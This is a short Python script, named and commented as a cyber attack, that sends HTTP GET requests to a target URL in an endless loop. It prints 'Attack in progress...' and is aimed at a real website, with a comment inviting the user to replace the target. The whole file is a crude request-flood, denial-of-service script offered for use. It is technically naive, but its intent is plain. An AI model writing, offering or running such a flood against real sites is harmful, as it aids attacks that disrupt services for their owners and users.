import requests
import time

def cyber_attack(url):
    while True:
        try:
            requests.get(url)
            print("Attack in progress...")
        except:
            print("Error occurred, retrying...")
            time.sleep(1)

# Replace with the target URL
target_url = "https://www.hackthebox.com"

# Start the attack
cyber_attack(target_url)